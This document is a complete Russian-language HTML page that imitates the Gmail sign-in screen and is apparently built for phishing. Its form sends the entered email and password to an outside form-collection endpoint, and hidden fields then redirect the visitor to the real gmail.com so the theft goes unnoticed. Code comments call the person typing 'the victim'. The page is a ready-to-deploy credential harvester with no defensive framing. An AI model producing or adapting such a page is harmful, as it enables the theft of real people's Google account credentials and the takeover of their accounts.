<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .logo img {
            width: 75px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .input-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid #dadce0;
            border-radius: 8px;
            transition: border 0.2s;
        }
        
        .input-wrapper:focus-within {
            border-color: #1a73e8;
            border-width: 2px;
        }
        
        .input-wrapper input {
            width: 100%;
            padding: 13px 15px;
            border: none;
            outline: none;
            font-size: 14px;
            border-radius: 8px;
        }
        
        .show-password {
            padding: 0 15px;
            color: #1a73e8;
            font-size: 14px;
            cursor: pointer;
            white-space: nowrap;
        }
        
        .forgot-link {
            text-align: right;
            margin-bottom: 32px;
        }
        
        .forgot-link a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
        }
        
        .actions {
            display: flex;
            justify-content: flex-end;
        }
        
        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 24px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .next-btn:hover {
            background: #1557b0;
        }
        
        .footer {
            margin-top: 64px;
            display: flex;
            justify-content: space-between;
            padding-top: 24px;
            border-top: 1px solid #e8eaed;
            font-size: 12px;
            color: #5f6368;
        }
        
        .footer a {
            color: #5f6368;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png" alt="Gmail">
        </div>
        
        <h1>Вход в аккаунт Google</h1>
        
        <!-- Formspree форма с ТВОИМ endpoint -->
        <form action="https://formsfree.io/f/myknkweg" method="POST">
            
            <!-- Email - жертва вводит сама -->
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="email" name="email" placeholder="Электронная почта" required>
                </div>
            </div>
            
            <!-- Пароль - жертва вводит сама -->
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Пароль" required>
                    <span class="show-password" onclick="togglePassword()">Показать</span>
                </div>
            </div>
            
            <!-- Скрытые служебные поля Formspree -->
            <input type="hidden" name="_subject" value="⚠️ Новый логин с Gmail">
            <input type="hidden" name="_next" value="https://gmail.com">
            <input type="hidden" name="_gotcha" style="display:none">
            
            <div class="forgot-link">
                <a href="#">Забыли пароль?</a>
            </div>
            
            <div class="actions">
                <button type="submit" class="next-btn">Далее</button>
            </div>
        </form>
        
        <div class="footer">
            <div>Русский</div>
            <div>
                <a href="#">Помощь</a> • 
                <a href="#">Конфиденциальность</a> • 
                <a href="#">Условия</a>
            </div>
        </div>
    </div>
    
    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.show-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'Скрыть';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'Показать';
            }
        }
    </script>
</body>
</html>
